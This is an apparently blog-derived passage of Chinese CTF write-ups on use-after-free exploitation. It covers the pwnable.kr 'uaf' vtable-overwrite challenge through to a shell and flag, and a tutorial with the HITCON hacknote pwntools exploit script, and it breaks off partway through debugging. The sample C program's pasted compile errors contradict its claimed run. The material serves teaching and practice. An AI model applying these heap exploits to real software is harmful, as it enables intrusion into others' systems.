age)&#123;</span><br><span class="line">                this-&gt;name &#x3D; name;</span><br><span class="line">                this-&gt;age &#x3D; age;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual void introduce()&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Woman: public Human&#123;</span><br><span class="line">public:</span><br><span class="line">        Woman(string name, int age)&#123;</span><br><span class="line">                this-&gt;name &#x3D; name;</span><br><span class="line">                this-&gt;age &#x3D; age;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual void introduce()&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        Human* m &#x3D; new Man(&quot;Jack&quot;, 25);</span><br><span class="line">        Human* w &#x3D; new Woman(&quot;Jill&quot;, 21);</span><br><span class="line"></span><br><span class="line">        size_t len;</span><br><span class="line">        char* data;</span><br><span class="line">        unsigned int op;</span><br><span class="line">        while(1)&#123;</span><br><span class="line">                cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;</span><br><span class="line">                cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                switch(op)&#123;</span><br><span class="line">                        case 1:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                break;</span><br><span class="line">                        case 2:</span><br><span class="line">                                len &#x3D; atoi(argv[1]);</span><br><span class="line">                                data &#x3D; new char[len];</span><br><span class="line">                                read(open(argv[2], O_RDONLY), data, len);</span><br><span class="line">                                cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;</span><br><span class="line">                                break;</span><br><span class="line">                        case 3:</span><br><span class="line">                                delete m;</span><br><span class="line">                                delete w;</span><br><span class="line">                                break;</span><br><span class="line">                        default:</span><br><span class="line">                                break;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先查看一下保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uaf@pwnable:~$ checksec uaf</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;uaf&#x2F;uaf&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>因为这是一道开源pwn，给了我们源码，而且代码也不复杂，没有什么逆向的必要，为了方便理解，我就直接从源码进行分析。</p>
<h3 id="类的继承和虚表"><a href="#类的继承和虚表" class="headerlink" title="类的继承和虚表"></a>类的继承和虚表</h3><p>可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。<br>Man和Woman都继承了Human类的vtable，可以通过调试，跟随子类的构造函数，找到vtable。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Human&#123;</span><br><span class="line">private:</span><br><span class="line">	virtual void give_shell()&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">protected:</span><br><span class="line">	int age;</span><br><span class="line">	string name;</span><br><span class="line">public:</span><br><span class="line">	virtual void introduce()&#123;</span><br><span class="line">		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Man: public Human&#123;</span><br><span class="line">public:</span><br><span class="line">        Man(string name, int age)&#123;</span><br><span class="line">                this-&gt;name &#x3D; name;</span><br><span class="line">                this-&gt;age &#x3D; age;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual void introduce()&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Woman: public Human&#123;</span><br><span class="line">public:</span><br><span class="line">        Woman(string name, int age)&#123;</span><br><span class="line">                this-&gt;name &#x3D; name;</span><br><span class="line">                this-&gt;age &#x3D; age;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual void introduce()&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="UAF-1"><a href="#UAF-1" class="headerlink" title="UAF"></a>UAF</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Human* m &#x3D; new Man(&quot;Jack&quot;, 25);</span><br><span class="line">Human* w &#x3D; new Woman(&quot;Jill&quot;, 21);</span><br><span class="line">size_t len;</span><br><span class="line">char* data;</span><br><span class="line">unsigned int op;</span><br><span class="line">while(1)&#123;</span><br><span class="line">        cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line">        switch(op)&#123;</span><br><span class="line">                 case 1:</span><br><span class="line">                        m-&gt;introduce();</span><br><span class="line">                        w-&gt;introduce();</span><br><span class="line">                        break;</span><br><span class="line">                case 2:</span><br><span class="line">                        len &#x3D; atoi(argv[1]);</span><br><span class="line">                        data &#x3D; new char[len];</span><br><span class="line">                        read(open(argv[2], O_RDONLY), data, len);</span><br><span class="line">                        cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;</span><br><span class="line">                        break;</span><br><span class="line">                case 3:</span><br><span class="line">                        delete m;</span><br><span class="line">                        delete w;</span><br><span class="line">                        break;</span><br><span class="line">                default:</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以看出程序给了我们3个选项</p>
<ul>
<li>use 使用指针指向的函数</li>
<li>after 分配一段地址空间，我们可以用其将已经被free的内存，重新allocate</li>
<li>free 将指针指向的内存释放</li>
</ul>
<p>组合起来就是UAF。</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
<li><p>调试找到虚表中give_shell函数地址。</p>
</li>
<li><p>free后再allocate，得到一个可控的地址空间.</p>
</li>
<li><p>为了在use，即m-&gt;introduce()时，将本来执行的introduce函数变成执行give_shell函数，<strong>在allocate的同时，改写虚表指针</strong>。</p>
</li>
<li><p>劫持控制流，执行give_shell</p>
<h2 id="漏洞调试和利用"><a href="#漏洞调试和利用" class="headerlink" title="漏洞调试和利用"></a>漏洞调试和利用</h2><h3 id="找到Man的构造函数，从而找到虚函数表"><a href="#找到Man的构造函数，从而找到虚函数表" class="headerlink" title="找到Man的构造函数，从而找到虚函数表"></a>找到Man的构造函数，从而找到虚函数表</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128163444394.png" alt="image-20210128163444394"></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  b * 0x400f13</span><br><span class="line">gef➤  ni</span><br><span class="line">gef➤  p $ebx												&#x2F;&#x2F;在构造函数处下断点</span><br><span class="line">$1 &#x3D; 0x614c50</span><br><span class="line">gef➤  p &#x2F;x $ebx											&#x2F;&#x2F;打印出实例化的Man对象的地址</span><br><span class="line">$2 &#x3D; 0x614c50</span><br><span class="line">gef➤  x&#x2F;10 0x614c50									&#x2F;&#x2F;查看Man对象的内存地址空间虚表地址为0x401570</span><br><span class="line">0x614c50:	0x00401570	0x00000000	0x00000019	0x00000000</span><br><span class="line">0x614c60:	0x00614c38	0x00000000	0x000203a1	0x00000000</span><br><span class="line">0x614c70:	0x00000000	0x00000000</span><br><span class="line">gef➤  x&#x2F;10 0x00401570</span><br><span class="line">0x401570 &lt;_ZTV3Man+16&gt;:	0x0040117a	0x00000000	0x004012d2	0x00000000</span><br><span class="line">0x401580 &lt;_ZTV5Human&gt;:	0x00000000	0x00000000	0x004015f0	0x00000000</span><br><span class="line">0x401590 &lt;_ZTV5Human+16&gt;:	0x0040117a	0x00000000</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128163708847.png" alt="image-20210128163708847" style="zoom:50%;">

<h3 id="覆盖虚表指针"><a href="#覆盖虚表指针" class="headerlink" title="覆盖虚表指针"></a>覆盖虚表指针</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;10 0x00401570</span><br><span class="line">0x401570 &lt;_ZTV3Man+16&gt;:	0x0040117a	0x00000000	0x004012d2	0x00000000</span><br><span class="line">0x401580 &lt;_ZTV5Human&gt;:	0x00000000	0x00000000	0x004015f0	0x00000000</span><br><span class="line">0x401590 &lt;_ZTV5Human+16&gt;:	0x0040117a	0x00000000</span><br><span class="line"></span><br><span class="line">0x0040117a give_shell		0x004012d2 introduce</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128164102514.png" alt="image-20210128164102514"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128164033393.png" alt="image-20210128164033393"></p>
<p>call introduce</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128164313271.png" alt="image-20210128164313271"></p>
<p>可以看出在执行m-&gt;introduce()的时候，调用call [vptr+8]。<br>为了执行give_shell，我们覆盖虚表指针，让它前移8个字节，这样call [vptr+8]的时候就调用give_shell了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128165237867.png" alt="image-20210128165237867">)give_shell() 的地址一共有三个，分别对应 Human Man Woman 虚函数表内 give_shell() 的地址<br>从这三个地址中任选一个 - 8，作为新的 Man 的虚表地址。</p>
<p><strong>allocate</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210128164503929.png" alt="image-20210128164503929"></p>
<p>从上图可以看出，原本Man对象分配的堆空间是0x18，即24字节，所以我们在再次分配的时候，也要分配24字节，保证自己拿到的是原先被free掉的地址空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Human* m &#x3D; new Man(&quot;Jack&quot;, 25);</span><br><span class="line">Human* w &#x3D; new Woman(&quot;Jill&quot;, 21);</span><br><span class="line">...</span><br><span class="line">delete m;</span><br><span class="line">delete w;</span><br></pre></td></tr></table></figure>

<p><strong>因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len &#x3D; atoi(argv[1]);</span><br><span class="line">data &#x3D; new char[len];</span><br><span class="line">read(open(argv[2], O_RDONLY), data, len);</span><br></pre></td></tr></table></figure>

<p>在此题中，是通过从文件中读出内容覆盖原先的内容的，等同于之前写的<code>strcpy(p-&gt;name,data)</code>，读取的长度是命令行的argv[1]，打开的文件是argv[2]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x401570-0x8&#x3D;0x401568-&gt;\x68\x15\x40\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uaf@pwnable:~$ python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; &#x2F;tmp&#x2F;uaf.txt</span><br><span class="line">uaf@pwnable:~$ .&#x2F;uaf 24 &#x2F;tmp&#x2F;uaf.txt</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">3</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">1</span><br><span class="line">$ ls</span><br><span class="line">flag  uaf  uaf.cpp</span><br><span class="line">$ cat flag</span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html">http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html</a></p>
<p><a href="https://eternalsakura13.com/2018/02/13/uaf/">https://eternalsakura13.com/2018/02/13/uaf/</a></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
        <tag>UAF</tag>
      </tags>
  </entry>
  <entry>
    <title>Use After Free</title>
    <url>/2021/01/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Use-After-Free/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
<a id="more"></a>

<p>这里给出一个简单的例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1&#x3D;(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1&#x3D;echo;</span><br><span class="line">    p1(&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); &#x2F;&#x2F;在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1(&quot;hello again\n&quot;); &#x2F;&#x2F;p1指针未被置空,虽然free了,但仍可使用.</span><br><span class="line">    func_ptr *p2&#x3D;(func_ptr*)malloc(4*sizeof(int));&#x2F;&#x2F;malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);&#x2F;&#x2F;p2与p1指针指向的内存为同一地址</span><br><span class="line">    p1&#x3D;evil_fuc; &#x2F;&#x2F;在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p2(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc 2.cpp -o 2 -m32</span><br><span class="line">2.cpp: In function ‘int main()’:</span><br><span class="line">2.cpp:16:7: error: cannot convert ‘void(char*)’ to ‘void (**)(char*)’ in assignment</span><br><span class="line">     p1&#x3D;echo;</span><br><span class="line">       ^</span><br><span class="line">2.cpp:17:23: error: ‘p1’ cannot be used as a function</span><br><span class="line">     p1(&quot;hello world\n&quot;);</span><br><span class="line">                       ^</span><br><span class="line">2.cpp:19:23: error: ‘p1’ cannot be used as a function</span><br><span class="line">     p1(&quot;hello again\n&quot;); &#x2F;&#x2F;p1指针未被置空,虽然free了,但仍可使用.</span><br><span class="line">                       ^</span><br><span class="line">2.cpp:23:7: error: cannot convert ‘void(char*)’ to ‘void (**)(char*)’ in assignment</span><br><span class="line">     p1&#x3D;evil_fuc; &#x2F;&#x2F;在这里将p1指针里面保存的echo函数指针覆盖成</span><br><span class="line">       ^</span><br><span class="line">2.cpp:24:17: error: ‘p2’ cannot be used as a function</span><br><span class="line">     p2(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;2       </span><br><span class="line">malloc addr: 0x8e83008</span><br><span class="line">hello world</span><br><span class="line">hello again</span><br><span class="line">malloc addr: 0x8e83008</span><br><span class="line">malloc addr: 0x8e83008</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(oldthree) gid&#x3D;1000(oldthree) groups&#x3D;1000(oldthree),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">lab 10 hacknote</a> 为例。</p>
<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">puts(&quot; 1. Add note          &quot;);</span><br><span class="line"> puts(&quot; 2. Delete note       &quot;);</span><br><span class="line"> puts(&quot; 3. Print note        &quot;);</span><br><span class="line"> puts(&quot; 4. Exit              &quot;);</span><br></pre></td></tr></table></figure>

<p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p>
<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  note *v0; &#x2F;&#x2F; ebx</span><br><span class="line">  signed int i; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; &#x2F;&#x2F; [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  if ( count &lt;&#x3D; 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] &#x3D; malloc(8u);</span><br><span class="line">        if ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put &#x3D; print_note_content;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size &#x3D; atoi(&amp;buf);</span><br><span class="line">        v0 &#x3D; notelist[i];</span><br><span class="line">        v0-&gt;content &#x3D; malloc(size);</span><br><span class="line">        if ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, notelist[i]-&gt;content, size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++count;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[v1]-&gt;content);</span><br><span class="line">    free(notelist[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat &#x2F;home&#x2F;hacknote&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？</p>
<p>我们可以简单来看一下每一个 note 生成的具体流程</p>
<ol>
<li><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。</p>
</li>
<li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+                       </span><br><span class="line">|   put           |                       </span><br><span class="line">+-----------------+                       </span><br><span class="line">|  b* content       |       size              </span><br><span class="line">+-----------------+-------------------&gt;+----------------+</span><br><span class="line">                                       |     real       |</span><br><span class="line">                                       |    content     |</span><br><span class="line">                                       |                |</span><br><span class="line">                                       +----------------+</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p>
<ul>
<li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
<li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
<li>释放 note0</li>
<li>释放 note1</li>
<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li>
<li>note2 其实会分配 note1 对应的内存块。</li>
<li>real content 对应的 chunk 其实是 note0。</li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
</ul>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def addnote(size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delnote(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def printnote(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(r)</span><br><span class="line">magic &#x3D; 0x08048986</span><br><span class="line"></span><br><span class="line">addnote(32, &quot;aaaa&quot;) # add note 0</span><br><span class="line">addnote(32, &quot;ddaa&quot;) # add note 1</span><br><span class="line"></span><br><span class="line">delnote(0) # delete note 0</span><br><span class="line">delnote(1) # delete note 1</span><br><span class="line"></span><br><span class="line">addnote(8, p32(magic)) # add note 2</span><br><span class="line"></span><br><span class="line">printnote(0) # print note 0</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>gdb进行调试看一下执行的流程，首先下断点</p>
<p><strong>两处 malloc 下断点</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b* 0x0804875C</span><br><span class="line">Breakpoint 1 at 0x804875c</span><br><span class="line">gdb-peda$ b *0x080486CA</span><br><span class="line">Breakpoint 2 at 0x80486ca</span><br></pre></td></tr></table></figure>

<p><strong>两处 free 下断点</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b *0x08048893</span><br><span class="line">Breakpoint 3 at 0x8048893</span><br><span class="line">gdb-peda$ b *0x080488A9</span><br><span class="line">Breakpoint 4 at 0x80488a9</span><br></pre></td></tr></table></figure>

<p>然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x0924d008。（eax 存储函数返回值）</p>
